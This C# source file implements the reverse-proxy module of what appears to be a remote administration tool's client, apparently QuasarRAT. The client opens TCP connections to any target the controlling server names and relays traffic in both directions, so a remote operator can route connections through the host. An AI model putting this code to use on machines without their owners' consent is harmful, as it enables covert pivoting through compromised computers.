using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.Networking;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
    public class ReverseProxyClient
    {
        public const int BUFFER_SIZE = 8192;

        public int ConnectionId { get; private set; }
        public Socket Handle { get; private set; }
        public string Target { get; private set; }
        public int Port { get; private set; }
        public Client Client { get; private set; }
        private byte[] _buffer;
        private bool _disconnectIsSend;

        public ReverseProxyClient(ReverseProxyConnect command, Client client)
        {
            this.ConnectionId = command.ConnectionId;
            this.Target = command.Target;
            this.Port = command.Port;
            this.Client = client;
            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //Non-Blocking connect, so there is no need for a extra thread to create
            this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
        }

        private void Handle_Connect(IAsyncResult ar)
        {
            try
            {
                this.Handle.EndConnect(ar);
            }
            catch { }

            if (this.Handle.Connected)
            {
                try
                {
                    this._buffer = new byte[BUFFER_SIZE];
                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
                    Disconnect();
                }

                IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(Client);
            }
            else
            {
                new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            try
            {
                int received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] payload = new byte[received];
                Array.Copy(_buffer, payload, received);
                new ReverseProxyData(this.ConnectionId, payload).Execute(Client);
            }
            catch
            {
                Disconnect();
                return;
            }

            try
            {
                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
                return;
            }
        }

        public void Disconnect()
        {
            if (!_disconnectIsSend)
            {
                _disconnectIsSend = true;
                //send to the Server we've been disconnected
                new ReverseProxyDisconnect(this.ConnectionId).Execute(Client);
            }

            try
            {
                Handle.Close();
            }
            catch { }

            Client.RemoveProxyClient(this.ConnectionId);
        }

        public void SendToTargetServer(byte[] data)
        {
            try
            {
                Handle.Send(data);
            }
            catch { Disconnect(); }
        }
    }
}
